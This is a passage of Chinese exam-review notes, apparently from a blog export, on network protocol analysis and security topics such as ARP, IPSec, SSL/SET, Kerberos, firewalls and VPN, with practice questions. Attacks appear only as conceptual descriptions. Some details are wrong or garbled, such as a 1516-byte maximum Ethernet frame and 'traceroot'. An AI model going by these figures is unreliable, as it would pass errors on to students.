**21、物理地址、端口地址、逻辑地址**\n\n```\na.物理地址--MAC地址\n物理地址工作在最底层，即数据链路层和物理层的帧（frame，一种数据单位，由比特构成）中，它每一次传输都会改变，比如从帧A一台计算机a到一个路由器b使用了一组地址，该帧A在路由器b到路由器c中就会换另一组地址，它是可变的。\nb.逻辑地址--IP地址\n即世界上所有的计算机都有一个32位的地址（IPv4），它唯一的表示每一台计算机，后来IPv4地址不够用了，就出现了IPv6地址，128位长。只需记住一点，无论IPv4还是IPv6地址都是逻辑地址，它们是唯一的表示一台计算机的IP地址。它工作在网络层，在传输的过程中是不会变的。\nc.端口地址\n我们通过逻辑地址实现了计算机之间的通信，但是这样并没有什么意义，比如你在打英雄联盟，这时你需要把数据传输到其他玩家的计算机上还是传输到其他玩家的英雄联盟上呢？你打出了100点伤害，这样一个数字，传到计算机上毫无意义，但是传输到英雄联盟中，英雄联盟就知道你造成了100点伤害，并在游戏里计算。这样一个简单的例子说明计算机之间的通信实质上是不同计算机之间进程的通信。而端口号就是唯一的表示这些进程的编号。(进程：运行着的程序)端口号有16位，0到65535，一共有2^16个端口号。通过端口号可以找到计算机运行的应用程序。如Web服务器对应的端口号是80，我们通过80端口实现了上网的功能。端口地址工作在传输层，在传输的过程中是不会变的，端口地址就是端口号。\n\n\n端口地址——传输层\n逻辑地址——网络层\n物理地址——数据链路层和物理层\n```\n#### **22、交换式网络中捕获网络流量的基本方法**\n\n4种 \n端口镜像、集线器接出、使用网络分流器、ARP缓存污染攻击\n\n#### **23、传输层可靠性的保障机制**\n\n（1）校验和\n（2）面向连接\n（3）序号和确认序号\n（4）确认应答机制 \n（5）超时重传机制\n（6）流量控制 \n（7）拥塞避免\n\n#### **24、以太网帧的最大帧长（MTU）1516字节，以太网帧的最小帧长64字节**\n\n#### **25、通信服务可以分为两大类**\n\n面向连接服务和无连接服务\n\n#### **26、了解 PPPoE**\n\nPPPoE（英语：Point-to-Point Protocol Over Ethernet），以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。由于协议中集成PPP协议，所以实现出传统以太网不能提供的身份验证、加密以及压缩等功能，也可用于缆线调制解调器（cable modem）和数字用户线路（DSL）等以以太网协议向用户提供接入服务的协议体系。\nPPPoE协议的作用是：实现有效的用户管理，进行网络接入计费等\n\n#### 27、以太网帧的最大传输单元1500字节\n\n#### 28、什么是“网络地图”及在网络协议分析的作用？\n\n网络地图，又称网络拓扑图，是指用传输媒体互连各种设备的物理布局\n确定数据包嗅探器的安装位置，在故障排除和分析中有重要作用\n\n#### 29、数据包嗅探过程中涉及到软件和硬件之间的协作。\n\n#### 30、在交换式网络环境中进行数据包嗅探的指导准则\n\n![](https://i.loli.net/2019/11/23/3uEBq5GJ8jNLvbe.png)\n![](https://i.loli.net/2019/11/23/UEYGlhLWZnv5e4w.png)\n\n#### 31、通过在Wireshark的Packet Details面板中对捕获的ARP请求数据包进行分析\n\n[认识wireshark的界面](https://www.jianshu.com/p/da31d059e526)\n\n#### 32、网络协议通常可以用来解决哪些问题？\n\n**发起连接：**是由客户端还是服务器发起连接？在真正通信之前必须要交换哪些信息？\n**协商连接参数：**通信需要进行协议加密吗？加密密钥如何在通信双方之间进行传输？\n**数据格式：**通信数据在数据包中如何排列？数据到达接收设备时以什么样的顺序进行处理？\n**错误检测与校正：**当数据包花了太长的时间才到达目的地时如何处理？当客户端暂时无法和服务器建立通信时，该如何恢复连接？\n**连接终止：**一台主机如何告知另一台主机通信已经结束？为了礼貌地终止通信，应该传送什么样的最终信息？\n\n#### 33、ARP协议格式首部，用图表给出各个字段名称和长度。 \n\n![](https://i.loli.net/2019/11/23/c6BXCtoELrTRMAq.png)\n\n#### 34、选择一款数据包嗅探器时，需要考虑哪些因素。并简述每个因素。\n\n**支持的协议：**数据包嗅探器对协议解析的支持范围各不相同，大部分通常都能解析常见的网络协议（如IPv4和ICMP）、传输层协议（如TCP和UDP），甚至一些应用层协议（如DNS和HTTP）。然而，它们可能并不支持一些非传统协议或新协议（如IPv6、SMBv2、SIP等）。在选择一款嗅探器时，需要确保它能够支持你所要用到的协议。\n**用户友好性：**考虑数据包嗅探器的界面布局、安装的容易度，以及操作流程的通用性。你选择的嗅探器应该适合你的专业知识水平。如果你的数据包分析经验还很少的话，你可能需要避免选择那些命令行的嗅探器，比如tcpdump。另一方面，如果你拥有丰富的经验，你可能会觉得这类命令行程序会更具有吸引力。在你逐步积累数据包分析经验时，你甚至会发现组合使用多种数据包嗅探器软件将更有助于适应特定的应用场景。\n**费用：**关于数据包嗅探器最伟大的事情是有着很多能够与任何商业产品相媲美的免费工具。商业产品与其他替代品之间最显著的区别是它们的报告引擎，商业产品通常包括各种花哨的报告生成模块，而在免费软件中则通常缺乏，甚至没有该模块。\n**技术支持：**即使你已经掌握了嗅探软件的基本用法，但是你还是偶尔会在遇到一些新问题时需要技术支持。在评估技术支持时，你可以寻找开发人员文档、公众论坛和邮件列表。虽然对于一些像Wireshark这样的免费软件可能缺乏一些开发人员文档，但使用这些应用软件的社区往往可以填补这些空白。使用者和贡献者社区会提供一些讨论区、维基、博客，来帮助你获得更多关于数据包嗅探器的使用方法。\n**操作系统支持：**遗憾的是，并不是所有的数据包嗅探器都支持所有的操作系统平台。你需要选择一款嗅探器，能够支持所有你将要使用的操作系统。如果你是一位顾问，你可能需要在大多数操作系统平台上进行数据包捕获和分析，那么你就需要一款能够在大多数操作系统平台上运行的嗅探器。你还需要留意，你有时会在一台机器上捕获数据包，然后在另一台机器上分析它们。操作系统之间的差异，可能会迫使你在不同的设备上使用不同的嗅探器软件。\n\n#### 35、通过在Wireshark的Packet Details面板中对捕获的IP协议头数据包进行分析\n\n#### 36、绘制IPv4数据报首部，给出各个字段名称和长度。 \n\n![](https://i.loli.net/2019/11/23/qBR29QlCYImLVZw.png)\n\n一、选择题（30小题，总计30分）        二、填空题15分   \n三、问答题（5小题共40分）             四、分析题15分\n\n参考：\n[计算机网络(第7版)读书笔记](https://www.smi1e.top/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC7%E7%89%88%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/)\n[计算机网络及 Wireshark 学习笔记](https://kyangc.com/2015/07/20/wireshark-learning-note/)\n\n\n\n","tags":["网络协议分析"],"categories":["CS基础"]},{"title":"网络安全技术复习","url":"/posts/51545.html","content":"## 一、绪论\n\n### 网络安全的基本概念\n#### 定义：\n\n网络系统的`软件`、`硬件`以及系统中存储和传输的`数据`受到保护，不因偶然的或者恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常地运行，网络服务不中断。\n#### 属性:\n**机密性**：保证信息与信息系统不被非授权的用户、实体或过程所获取与使用\n**完整性**：信息在存贮或传输时不被修改、破坏，或不发生信息包丢失、乱序等\n**可用性**：信息与信息系统可被授权实体正常访问的特性，即授权实体当需要时能够存取所需信息 \n**可控性**：对信息的存储于传播具有完全的控制能力，可以控制信息的流向和行为方式\n**真实性**：也就是可靠性，指信息的可用度，包括信息的完整性、准确性和发送人的身份证实等方面，它也是信息安全性的基本要素\n\n其中，`机密性、完整性和可用性`通常被认为是网络安全的三个基本属性（CIA三要素）\n#### 模型:\n![](https://i.loli.net/2019/11/05/nSqjy1iIPTWvroc.png)\n\n![](https://i.loli.net/2019/11/05/l1co4V6hsRPzkir.png)\n#### 攻击手段:\n**被动攻击**:试图收集、利用系统的信息但不影响系统的正常访问，数据的合法用户对这种活动一般不会觉察到。\n被动攻击方式：信息收集和流量分析\n**主动攻击**:攻击者访问他所需信息的故意行为，一般会改变系统资源或影响系统运作。 \n主动攻击方式：包括对数据流进行篡改或伪造数据流，可分为四类：伪装、重放、消息篡改和拒绝服务。\n#### 安全服务：\nOSI安全体系结构将安全服务定义为通信开放系统协议层提供的服务，从而保证系统或数据传输有足够的安全性\nOSI安全体系结构定义了5大类共14个安全服务\n![](https://i.loli.net/2019/11/12/riRDczWeldkFtIo.png)\n#### 安全机制：\n![](https://i.loli.net/2019/11/12/n9bDwCr84jRpXu7.png)\n### 造成Internet安全问题的主要原因\n1.信息交换和共享日益依赖于Internet\n2.基于TCP/IP协议，自身缺乏安全策略\n· 信息传输未加密\n· 开放性：协议的体系和实现是公开的\n3.大量设计缺陷和安全漏洞\n4.IP协议栈各层都有安全问题\n5.外来攻击者\n### 网络安全形势严峻的原因\n1.中国互联网持续快速发展，而我国网络安全基础设施建设跟不上互联网发展的步伐，民众的网络安全意识薄弱\n2.技术的不断提高，攻击工具日益专业化、易用化，攻击方法也越来越复杂、隐蔽，防护难度较大\n3.电子商务领域不断扩展，与现实中的金融体系日益融合，为网络世界的虚拟要素附加了实际价值，这些信息系统成为黑客攻击牟利的目标\n## 二、网络协议基础\n### 网络体系结构各层的功能\n**物理层**：考虑用多大的电压代表所传输的比特，以及接收方如何识别出这些比特\n**数据链路层**：包括操作系统中的设备驱动程序和计算机中对应的网络接口卡，负责处理与传输电缆的物理接口细节\n**网络层**：负责处理分组在网络中的活动，例如分组的选路\n**传输层**：负责向两个主机中进程之间的通信提供通用的数据传输服务\n**应用层**：定义应用进程间通信和交互的规则,负责通过应用进程间的交互来完成特定网络应用。应用层的协议有支持万维网应用的HTTP协议，支持电子邮件的SMTP协议等\n### TCP/IP协议族中一些协议的安全问题\n#### ARP\nARP协议：利用ARP缓存表记录IP地址与MAC地址的对应关系，如果没有此项记录，则通过ARP广播获得目的主机的MAC地址\n![](https://ftp.bmp.ovh/imgs/2019/11/60fef59f64ac6ef3.png)\nARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\n**分类：**\n针对主机的ARP欺骗：冒充其它主机，接收该主机的信息\n针对交换机的ARP欺骗：利用工具产生欺骗MAC，并快速填满交换机的MAC地址表\n#### TCP\n。。。。。\n#### HTTP\n**HTTP 的主要特点**：HTTP 协议本身也是`无连接的`，虽然它使用了面向连接的 TCP 向上提供的服务。\n HTTP 1.0 协议是无状态的(stateless)。\n**无状态**： HTTP无法记住同一用户连续两次相同的连接\n使用Cookie来解决HTTP的无状态性\n带来的新问题：获取用户的个人隐私\n#### FTP\n多数FTP服务器可以用anonymous 用户名登录，这样存在让用户破坏系统和文件的可能；\n简单文件传输协议支持无认证操作。\n#### TELNET\ntelnet输入的账户和密码是明文传输的，容易被监听到\n#### SMTP\n1.电子邮件上的地址可以是假冒的，角色欺骗；\n2.电子邮件的内容是明文传输的，可能被偷看；\n3.电子邮件炸弹，计算机被电子邮件所淹没至主机崩溃；\n4.针对电子邮件的病毒\n#### ICMP\n对ICMP协议的利用：ping, traceroot\n**ping命令：**不光能验证网络的连通性，同时也会统计响应时间和包的生存周期（TTL） \n**traceroute命令：**能够打印出可执行程序主机一直到目标主机之前经历多少路由器。\n## 三、密码学在网络安全中的应用\n### 对称密码体制/非对称密码体制\n### 混合加密体制\n### 数字签名\n### 密钥管理\n## 四、消息鉴别\n消息鉴别协议的核心——鉴别函数\n### 如何利用鉴别函数构造鉴别协议\n。。。。。。\n### 分析一个鉴别协议的安全问题*\n。。。。。。\n## 五、身份认证\n认证分为身份认证和消息认证\n### 身份认证分类：\n1.计算机认证人的身份\n2.计算机认证计算机\n### 身份认证的概念\n是计算机及网络系统识别操作者身份的过程\n### 有哪些常用的身份认证方式，分析其优缺点\n用户名/口令方式\nIC卡认证\n生物特征认证\nUSB Key认证\n动态口令/动态密码\n数字签名\n![](https://i.loli.net/2019/11/12/8y9DP1jQudLr57N.png)\n**口令存储：**\n通常经过加密后存储在计算机中\n**口令传输：**\n一般采用双方协商好的加密算法或单向散列函数对口令进行处理后传输\n### 基于挑战应答/KDC方式的认证的作用\n提高了用户身份认证的安全性，可以抵抗重放攻击\n### 设计一个满足安全要求的认证协议*\n。。。。。。\n### Kerberos系统\n一种基于对称密钥、在网络上实施身份认证的服务。包含认证服务器(AS)和门票授权服务器（TGS）\n**设计目的：**解决分布式网络环境下用户访问网络资源时的安全问题\n![](https://i.loli.net/2019/11/11/QM35KG6YgHleNZ2.png)\n### PKI技术\nPKI是基于公钥密码技术，支持公钥管理，提供真实性、保密性、完整性以及可追究性的安全服务，具有普适性的安全基础设施。\n**PKI提供的服务：**\n数据传输的机密性（避免被截获）\n数据交换的完整性（避免被篡改）\n发送信息的不可否认性（避免事后不承认）\n交易者身份的确定性（避免被假冒）\n签名私钥为确保其性而不能够作备份。万一CA假冒\n## 六、Internet安全\n### 各层协议的安全\n![](https://i.loli.net/2019/11/07/JaphoPZ5LwRyHDm.png)\n![](https://i.loli.net/2019/11/07/5Df3rhlyw869AIW.png)\n![](https://i.loli.net/2019/11/07/jQtAeVJvSbnlGid.png)\n### IPSec\nIPSec对于IPv4是可选的，对于IPv6是强制性的。\n**IPSec的思想：**\n使用IP封装技术，对纯文本的包加密，封装在外层的IP数据报的首部里，用来对加密的包进行路由。到达接收端时，外层的IP报头被拆开，报文被解密。\n**IPSec的目的：**\n使需要安全措施的用户能够使用相应的加密安全体制，且该体制与算法无关，即使替换了加密算法也不会对其他部分产生影响\n**IPSec的功能：**\n保证数据来源可靠（认证）\n保证数据完整性（验证算法）\n保证数据机密性（加密）\n实现VPN（隧道模式）\n**IPSec工作模式和过程：**\n**工作模式：**\n`传输模式`：用于端到端的应用时，仅对源点做鉴别和完整性，没有提供保密性\n`隧道模式`：用于防火墙或其他安全网关，保护内部网络，隔离外部网络，不仅能提供AH提供的源点鉴别和数据完整性，还能提供保密性\n**AH协议：**\n![](https://i.loli.net/2019/11/08/Jcyv47M8DXfz5Ot.png)\n![](https://i.loli.net/2019/11/08/Cf3HdkZFMDzUSAm.png)\n**ESP协议：**\n![](https://i.loli.net/2019/11/08/6L2g5cAR3vTaN4O.png)\n![](https://i.loli.net/2019/11/08/vAIdWkcyoHUi1Bn.png)\n**IPSec密钥管理：**\nIPSec的安全服务要求支持共享密钥完成认证和保密\n手工管理\n自动管理\n```\nPhoturis\n简单Internet密钥管理协议SKIP\nInternet密钥交换协议IKE\nIPSec默认的协议--IKE\n```\n**因特网密钥交换协议IKE (Internet Key Exchange)**\nOakley——密钥生成协议\n安全密钥交换机制 SKEME (Secure Key Exchange Mechanism) ——用于密钥交换的协议 \n因特网安全关联和密钥管理协议 ISAKMP (Internet Secure Association and Key Management Mechanism) ——用于实现 IKE 中定义的密钥交换\n```\nIKE中的密钥交换基于Diffie-Hellman密钥交换：\n A → B:  ga     \n B → A:  gb  \n B和A都能得到一个正确相同的值：gab 由于该协议没有实现实体认证，容易受到中间人攻击（man-in-middle attack）\n安全密钥交换机制SKEME——用于密钥交换的协议，利用公钥加密来实现密钥交换协议中的实体鉴别，抵抗DH密钥交换中的中间人攻击\n```\n### SSL/SET\n**安全套接层协议（Secure Socket Layer)：**\n是对计算机之间整个会话进行加密的协议，提供了加密、认证服务和报文完整性。它能够对信用卡和个人信息提供较强的保护。SSL被用以完成需要的安全交易操作。在SSL中，采用了公开密钥和私有密钥两种加密方法。\n提供的服务：保密性、认证性、完整性\nHTTPS服务：当客户点击网站链接建立TCP连接后，先进行浏览器和服务器之间的握手协议，完成加密算法的协商和会话密钥的传递，然后进行安全数据传输。\n![](https://i.loli.net/2019/11/08/e1O5tUHWYboDqw2.png)\n**安全电子交易协议（Secure Electronic Transaction）：**\n它提供了消费者、商家和银行之间的认证，确保交易的保密性、可靠性和不可否认性，以保证支付信息的机密、支付过程的完整、商户及持卡人的合法身份、以及可操作性。SET中的核心技术主要有公开密匙加密、电子数字签名、电子信封、电子安全证书等。\n**SSL:**\n![](https://i.loli.net/2019/11/08/VoMhKtk3IfigJXa.png)\n![](https://i.loli.net/2019/11/08/NgiLJ4dn8qh6UvP.png)\n**SET:**\n![](https://i.loli.net/2019/11/08/wdxmXtZGCibRLNP.png)\n![](https://i.loli.net/2019/11/08/fIl7P4ocj3Rg59r.png)\n```\nSSL与SET两种协议的区别在哪里（C）。\nA. 加密方法\nB. 解密方法\nC. 网络中的层次\nD. 信息传输的保密\n[解析]SSL是基于传输层的协议，而SET则是基于应用层的协议。\nSET协议运行的目标主要有（A.B）。\nA．保证信息在互联网上安全传输\nB．保证电子商务参与者信息的相互隔离\nC．提供商品或服务\nD．通过支付网关处理消费者和在线商店之间的交易付款问题 \nSSL协议对于SET协议的劣势主要是无法保证：（C）\nA.信息的真实性\nB.信息的完整性\nC.信息的不可否认性\nD.信息的保密性\n```\n### PGP技术\n![](https://i.loli.net/2019/11/08/SGhU97D1nZQvsAd.png)\n![](https://i.loli.net/2019/11/08/ReuxbTIk9HvBtwy.png)\n![](https://i.loli.net/2019/11/08/9fdP7xmsBghpeA8.png)\n![](https://i.loli.net/2019/11/08/abMhNxLCFe7ztZ4.png)\n![](https://i.loli.net/2019/11/08/fPYBXKvZ7q2A5gk.png)\n### ARP欺骗\n![](https://ftp.bmp.ovh/imgs/2019/11/60fef59f64ac6ef3.png)\nARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\n**分类：**\n针对主机的ARP欺骗：冒充其它主机，接收该主机的信息\n针对交换机的ARP欺骗：利用工具产生欺骗MAC，并快速填满交换机的MAC地址表\n### IP欺骗\nIP欺骗：IP欺骗指攻击者假冒他人IP地址,发送数据包\n因为IP协议不对数据包中的IP地址进行认证, 因此任何人不经授权就可伪造IP包的源址。\n**分类：**\n基本的IP欺骗\nIP欺骗的高级应用——TCP会话劫持\n## 七、防火墙技术\n防火墙实现主要包括过滤机制和安全策略\n### 防火墙的类型：\n#### 包过滤路由器\n特点：\n在网络层上进行监测\n通常在路由器上实现\n#### 应用层网关\n特点：\n所有的连接都通过防火墙，防火墙作为网关\n在应用层上实现，网关理解应用协议，可以实施更细粒度的访问控制\n可以监视包的内容\n可以实现基于用户的认证\n可以提供理想的日志功能\n对每一类应用，都需要一个专门的代理，不够灵活\n非常安全，但是开销比较大\n#### 电路层网关\n特点：\n拓扑结构同应用程序网关相同\n接收客户端连接请求，代理客户端完成网络连接\n在客户和服务器间中转数据\n通用性强\n### 防火墙不能抵抗来自内网的攻击\n## 八、VPN技术\n**VPN（Virtual Private Network）定义：**\n利用Internet或其它公共互联网络的基础设施为用户创建隧道，来仿真专有的广域网，并提供与专用网络一样的安全和功能保障\n**VPN的目的：**\n资源访问限制于某些IP地址\n内部人员需要在外面访问内部网\n雇员可能在外地并需要访问网络\n专有网太贵\n外地的雇员也可能不是定点的\n**VPN类型：**\n按应用/服务类型分类：\n远程访问型VPN： 通过Internet接纳远程用户\nLAN间互连型VPN：通过Internet联结两个或多个LAN\n按实现的层次分类\n二层隧道VPN：PPTP、L2TP、OpenVPN\n三层隧道VPN：GRE、IPSec\n**VPN使用的技术：**\n隧道技术（Tunneling）\n加解密技术（Encryption & Decryption）\n用户身份认证/访问控制技术（Identification/Access Control）\n密钥管理技术（Key Management）\n\n----\n## 模拟试题\n### 一、选择题\n**1.** 以下关于对称加密的说法不正确的是（B）   \nA、在对称加密中，只有一个密钥用来加密和解密信息\nB、在对称加密中，用到了二个密钥来加密和解密信息，分别是公共密钥和私用密钥\nC、对称加密是一个简单的过程，双方都必需完全相信对方，并持有这个密钥的备份\nD、对称加密的速度非常快，允许你加密大量的信息而只需要几秒钟\n**2.** 被动攻击主要是监视公共媒体传输的信息，下列属于典型被动攻击的是(B)\nA、解密通信数据      B、会话拦截      C、系统干涉        D、修改数据\n**3.**\t针对窃听攻击采取的安全服务是(B)\nA.鉴别服务       B.数据机密性服务         C.数据完整性服务    D.抗抵赖服务\n**4.**\t以下属于对称加密算法的是(A)\nA、DES\nB、MD5\nC、HASH\nD、RSA\n**5.**\t在保证密码安全中，我们应采取的措施中不正确的是(D)\nA、不用生日做密码\nB、不要使用少于8位的密码\nC、密码不能以任何明文形式存在任何电子介质中\nD、用户可以不断地尝试密码输入，直到正确为止\n**6.**\t当你感觉到你的Win2000运行速度明显减慢，当你打开任务管理器后发现CPU的使用率达到了百分之百，你最有可能认为你受到了哪一种攻击(B)。\nA、特洛伊木马                B、拒绝服务          C、欺骗          D、中间人攻击\n**7.**\t入侵检测的目的是(B)\nA、实现内外网隔离与访问控制\nB、提供实时的检测及采取相应的防护手段，阻止黑客的入侵\nC、记录用户使用计算机网络系统进行所有活动的过程\nD、预防、检测和消除病毒\n**8.**\t网络的可用性是指（D）。\nA．网络通信能力的大小\t\tB．用户用于网络维修的时间\nC．网络的可靠性   \t\tD．用户可利用网络时间的百分比\n**9.**\t数字证书不包含（B）\nA.\t颁发机构的名称\tB. 证书持有者的私有密钥信息\nC.  证书的有效期\t D. CA 签发证书时所使用的签名算法\n**10.** 小李在使用Nmap对目标网络进行扫描时发现，某一个主机开放了25和110端口，此主机最有可能是什么(B)？ \nA、文件服务器          B、邮件服务器         C、WEB服务器               D、DNS服务器\n**11.**\t你想发现到达目标网络需要经过哪些路由器，你应该使用什么命令？(C)  \nA、ping            B、nslookup          C、traceroot                        D、ipconfig\n**12.**\t支持安全WEB服务的协议是（A）。\nA、HTTPS    B、WINS    C、SOAP    D、HTTP\n**13.**\t安全电子邮件使用（A）协议。\nA、PGP    B、HTTPS    C、MIME    D、DES\n**14.**\t公钥基础设施（PKI）的核心组成部分是（A）\nA、认证机构CA     B、X.509标准    C、密钥备份和恢复    D、PKI应用接口系统\n**15.**\t在在Kerberos 认证系统中，用户首先向（B）申请初始票据，然后从（C）获得会话密钥\nA、域名服务器     B、认证服务器AS     C、票据授予服务器TGS    D、认证中心CA\n**16.**\t以下关于VPN的说法中的哪一项是正确的？(C) \nA、VPN是虚拟专用网的简称，它只能对ISP实施维护\nB、VPN是只能在第二层数据链路层上实现加密\nC、IPSEC也是VPN的一种\nD、VPN使用通道技术加密，但没有身份验证功能\n### 二、填空题\n**1.**\t计算机安全主要为了保证计算机的`机密性`、`完整性` 和 `可用性`。\n**2.**\t安全攻击分为`主动`攻击和 `被动` 攻击。\n**3.**\tIPSec的两种工作模式是 `隧道` 模式和传输模式。\n**4.**\t在 PKI/PMI 系统中，一个合法用户只拥有一个唯一的 `公钥证书`\t，但可能会同时拥有多个不同的`属性证书`。\n**5.**\tSSL 是一种综合利用`对称密钥`和`非对称密钥`技术进行安全通信的工业标准。\n**6.** VPN 是利用 Internet 等`公共网络`的基础设施，通过`隧道`技术，为用户提供一条与专网相同的安全通道。\n**7.**\tVPN 系统中的三种典型技术分别是`隧道技术` 、`身份认证技术`和`加密技术`。\n**8.** 目前身份认证技术可分为 PKI 和非 PKI 两种类型，其中在 VPN 的用户身份认证中一般采用`非\nPKI\t`认证方式，而信息认证中采用`PKI`认证方式。\n### 三、名词解释\n**1.**\t机密性、完整性、可用性、可控性\n答：机密性是确保信息不暴露给未经授权的人或应用进程；\n完整性是指只有得到允许的人或应用进程才能修改数据，并且能够判别出数据是否已被更改；\n可用性是指只有得到授权的用户在需要时才可以访问数据，即使在网络被攻击时也不能阻碍授权用户对网络的使用； \n可控性是指能够对授权范围内的信息流向和行为方式进行控制\n**2.**\t防火墙\n答：防火墙是指设置在不同网络（如可信赖的企业内部局域网和不可信赖的公共网络）之间或网络安全域之间的一系列部件的组合，通过监测、限制、更改进入不同网络或不同安全域的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以防止发生不可预测的、潜在破坏性的入侵，实现网络的安全保护。\n**3.**\tVPN\n答：VPN（虚拟专用网）是利用 Internet 等公共网络的基础设施，通过隧道技术，为用户提供一条与专用网络具有相同通信功能的安全数据通道，实现不同网络之间以及用户与网络之间的相互连接.\n**4.** PKI\nPKI是基于公钥密码技术，支持公钥管理，提供真实性、保密性、完整性以及可追究性的安全服务，具有普适性的安全基础设施。\n**5.** 数字证书\n数字证书是一个经数字证书授权中心数字签名的包含公开密钥拥有者信息以及公开密钥的文件。\n**6.** 访问控则\n包括身份认证和权限验证用于防止未授权用户非法使用或越权使用系统资源\n**7.** 被动攻击\n试图收集、利用系统的信息但不影响系统的正常访问，数据的合法用户对这种活动一般不会觉察到。\n被动攻击方式：信息收集和流量分析\n**8.** 主动攻击\n攻击者访问他所需信息的故意行为，一般会改变系统资源或影响系统运作。 \n### 四、简答题\n**1.** OSI网络安全体系结构的五类安全服务和八类安全机制分别是什么？\n答：五大类安全服务(鉴别、访问控制、保密性、完整性、抗否认）\n八类安全机制(加密、数字签名、访问控制、数据完整性、鉴别交换、业务流填充、路由控制、公证）\n**2.** 包过滤防火墙的基本思想是什么？\n答： 包过滤防火墙的基本思想：对所接收的每个数据包进行检查，根据过滤规则，然后决定转发或者丢弃该包；包过滤防火墙往往配置成双向的；\n**3.** IPSec是哪一层的安全协议？其主要特征是什么？其协议部分由哪两部分组成？\n答：IPSec是网络层的安全协议，其主要特征是可以支持IP级所有流量的加密和/或认证。因此可以增强所有分布式应用的安全性。其协议部分分为:AH协议和ESP协议两部分。\n**4.** 什么是SSL？它是哪一层的安全协议?\n答：SSL （Secure Socket Layer）是一种在两个端实体（End Entity）之间提供安全通道的协议。它是传输层的安全协议。\n**5.** 什么是IP欺骗攻击？\n答：IP欺骗攻击就是攻击者伪装成目标主机与其他计算机进行通信，达到：隐藏自己的IP地址，防止被跟踪；以IP地址作为授权依据；穿越防火墙的目的\n**6.** 访问控制基本目标是什么？主要有哪几种访问控制策略？\n答：访问控制基本目标是防止对任何资源（如计算资源、通信资源或信息资源）进行未授权的访问。从而使计算机系统在合法范围内使用；决定用户能做什么，也决定代表一定用户利益的程序能做什么。\n主要访问控制策略有：自主访问控制（基于身份的访问控制IBAC), 强制访问控制(基于规则的访问控制RBAC),基于角色的访问控制(role-based policies)\n**7.** 深入分析Internet不安全的根源是什么?可采取那些相应的安全措施？\n不安全的根源：\n信息交换和共享日益依赖于Internet\n基于TCP/IP协议，自身缺乏安全策略\n大量设计缺陷和安全漏洞\nIP协议栈各层都有安全问题\n外来攻击者\n安全措施：\n1.从身份认证、访问控制、密码学、防火墙等技术入手，构建安全防护体系\n2.推广先进信息技术，建立信息安全制度\n3.增强防火墙控制，加强病毒防御工作\n**8.** 为什么IPSec中的AH协议与NAT有冲突?\nAH都会认证整个数据包。并且AH还会认证位于AH头之前的IP头。当NAT设备修改了IP头之后，IPSec 就会认为这是对数据包完整性的破坏，从而丢弃数据包。因此AH是不可能和NAT在一起工作的。\n**9.** 在对用户进行身份认证时，使用用户名/口令是一种常用的身份认证方式，请分析该认证方法的优缺点，并提出一些改进的建议。\n**优点：**简单，易实现，易理解和接受，成本低，无须任何附加设备\n**缺点：**口令一旦被泄露，用户即可被冒充。口令容易被猜解，口令在网络上传输的过程可能被截获。口令方案无法抵抗重放攻击。只能进行单向认证。\n**改进建议：**\n1.尽可能地选用易记、难猜、康分析能力强、能较好地抵抗离线字典攻击和在线字典攻击的口令。\n2.对口令的存储加密，尽可能地选用Hash散列值方式存储口令\n3.选用动态口令认证技术\n**10.** 信息安全的五大特性为保密性、完整性、可用性、可控性、不可否认性，请分别解释这些性质，并给出实现这些性质的密码学方法。\n**机密性**：保证信息与信息系统不被非授权的用户、实体或过程所获取与使用\n**完整性**：信息在存贮或传输时不被修改、破坏，或不发生信息包丢失、乱序等\n**可用性**：信息与信息系统可被授权实体正常访问的特性，即授权实体当需要时能够存取所需信息 \n**可控性**：对信息的存储于传播具有完全的控制能力，可以控制信息的流向和行为方式\n**不可否认性**：人们不能否认自己发送信息的行为和信息的内容。\n`机密性->加密算法 完整性->消息鉴别 可用性->访问控制    可控性->访问控制    不可否认性->数字签名`\n\n### 五、综合分析题\n**1.** 很多网络攻击都是针对网络协议的漏洞而发起的攻击，例如ARP欺骗。请介绍ARP协议，分析ARP协议的漏河，针对这样的漏洞，敌手可能发起怎样的攻击?\nARP协议是一种将IP地址转换成物理地址的协议，以便设备能够在共享介质的网络（如以太网）中通信。\nARP欺骗就是一种通过虚假请求或响应报文，使得其它主机的ARP列表发生改变而无法正常通信的攻击行为。\n针对主机的ARP欺骗：冒充其它主机，接收该主机的信息\n针对交换机的ARP欺骗：利用工具产生欺骗MAC，并快速填满交换机的MAC地址表\n**2.** 用户A和B在Internet上通信。A是发送方，他需要将消息m发送给B.由于m是非常重要的消息，他们不希望该消息的内容被其他人得到。对于接收方B,他还需要确信该消息是A发来的且消息m在通信过程中没有被篡改，已知A的公私钥对为（pkA,skA）,B的公私钥对为（pkB,sKB）。请运用密码学和网络安全知识，设计一个A与B通信的协议，并分析你的协议是如何满足上述安全要求的。\n![](https://i.loli.net/2019/11/12/86mEWXtqMfuDpvo.jpg)\n**6. 下列协议是Kerberos认证系统实现认证的核心协议，该协议以KDC为可信第三方进行集中式认证。通信双方（用户A和服务器B）通过该协议建立共享的会话密钥，并实现对双方的认证。该协议的描述加下：\n1.A->KDC: IDA||IDB||N1\n2.KDC->A: Eka[Ks||IDB||N1||Ekb[Ks||IDA]]\n3.A->B:  EKb[Ks||IDA]\n4.B->A:  EKs[l am bob||N2]\n5.A->B:  EKs[i am alie||f(N2)]\n其中,Ka和Kb分别是A与KDC,B与KDC事先共享的主密机:Ks是KDC产生的会话密钥: N:和N2是A和B产生的临时值(nonce):（是双方选定的一个函数。 请用文字描述该协议的每个步骤及其作用， 